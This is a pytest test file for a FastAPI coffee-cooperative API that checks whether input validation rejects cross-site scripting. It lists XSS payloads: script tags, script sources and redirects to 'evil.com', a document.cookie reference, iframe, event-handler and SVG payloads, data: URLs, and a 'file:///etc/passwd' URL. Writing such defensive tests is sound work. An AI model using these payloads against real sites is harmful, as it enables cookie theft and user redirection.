"""Tests for XSS (Cross-Site Scripting) protection."""

from fastapi.testclient import TestClient


def test_xss_script_tag_in_cooperative_name(client: TestClient, auth_headers):
    """Test that script tags in cooperative names are rejected."""
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<script src='http://evil.com/hack.js'></script>",
        "<SCRIPT>alert('XSS')</SCRIPT>",
        "<script>document.cookie</script>",
    ]

    for payload in xss_payloads:
        response = client.post(
            "/cooperatives/",
            headers=auth_headers,
            json={"name": payload, "region": "Cajamarca"},
        )
        # Should be rejected by validation
        assert response.status_code in [
            400,
            422,
        ], f"XSS payload not rejected: {payload}"


def test_xss_javascript_protocol_in_url(client: TestClient, auth_headers):
    """Test that javascript: protocol in URLs is rejected."""
    malicious_urls = [
        "javascript:alert('XSS')",
        "JAVASCRIPT:alert('XSS')",
        "javascript:void(0)",
        "javascript:window.location='http://evil.com'",
    ]

    for url in malicious_urls:
        response = client.post(
            "/cooperatives/",
            headers=auth_headers,
            json={"name": "Test Cooperative", "website": url, "region": "Cajamarca"},
        )
        # Should be rejected by validation
        assert response.status_code in [400, 422], f"Malicious URL not rejected: {url}"


def test_xss_iframe_injection(client: TestClient, auth_headers):
    """Test that iframe injections are rejected."""
    iframe_payloads = [
        "<iframe src='http://evil.com'></iframe>",
        "<IFRAME src='javascript:alert(1)'></IFRAME>",
        "test<iframe>evil</iframe>name",
    ]

    for payload in iframe_payloads:
        response = client.post(
            "/cooperatives/",
            headers=auth_headers,
            json={"name": payload, "region": "Cajamarca"},
        )
        # Should be rejected
        assert response.status_code in [
            400,
            422,
        ], f"Iframe payload not rejected: {payload}"


def test_xss_event_handlers(client: TestClient, auth_headers):
    """Test that event handler injections are rejected."""
    event_payloads = [
        "test onclick='alert(1)'",
        "test onload='malicious()'",
        "test onerror='alert(1)'",
        "<img src=x onerror='alert(1)'>",
    ]

    for payload in event_payloads:
        response = client.post(
            "/cooperatives/",
            headers=auth_headers,
            json={"name": payload, "region": "Cajamarca"},
        )
        # Should be rejected by middleware
        assert response.status_code in [
            400,
            422,
        ], f"Event handler not rejected: {payload}"


def test_xss_in_roaster_website(client: TestClient, auth_headers):
    """Test XSS protection in roaster website field."""
    malicious_urls = [
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
        "file:///etc/passwd",
    ]

    for url in malicious_urls:
        response = client.post(
            "/roasters/",
            headers=auth_headers,
            json={"name": "Test Roaster", "website": url},
        )
        # Should be rejected
        assert response.status_code in [400, 422], f"Malicious URL not rejected: {url}"


def test_xss_in_notes_field(client: TestClient, auth_headers):
    """Test that XSS in notes fields is handled."""
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:void(0)",
    ]

    for payload in xss_payloads:
        response = client.post(
            "/cooperatives/",
            headers=auth_headers,
            json={"name": "Test Cooperative", "region": "Cajamarca", "notes": payload},
        )
        # Should be rejected by middleware
        assert response.status_code in [
            400,
            422,
        ], f"XSS in notes not rejected: {payload}"


def test_xss_data_protocol_in_url(client: TestClient, auth_headers):
    """Test that data: protocol URLs are rejected."""
    data_urls = [
        "data:text/html,<script>alert('XSS')</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
    ]

    for url in data_urls:
        response = client.post(
            "/cooperatives/",
            headers=auth_headers,
            json={"name": "Test Cooperative", "website": url, "region": "Cajamarca"},
        )
        # Should be rejected
        assert response.status_code in [400, 422], f"Data URL not rejected: {url}"


def test_safe_content_accepted(client: TestClient, auth_headers):
    """Test that safe content is accepted."""
    safe_data = {
        "name": "La Cooperativa Especial",
        "region": "Cajamarca",
        "website": "https://example.com",
        "notes": "This is a safe note with normal text and numbers 123.",
        "contact_email": "contact@example.com",
    }

    response = client.post("/cooperatives/", headers=auth_headers, json=safe_data)

    # Should be accepted
    assert response.status_code == 200, "Safe content was rejected"
    data = response.json()
    assert data["name"] == safe_data["name"]


def test_xss_svg_injection(client: TestClient, auth_headers):
    """Test that SVG-based XSS attempts are rejected."""
    svg_payloads = [
        "<svg/onload=alert('XSS')>",
        "<svg><script>alert('XSS')</script></svg>",
    ]

    for payload in svg_payloads:
        response = client.post(
            "/cooperatives/",
            headers=auth_headers,
            json={"name": payload, "region": "Cajamarca"},
        )
        # Should be rejected
        assert response.status_code in [
            400,
            422,
        ], f"SVG payload not rejected: {payload}"
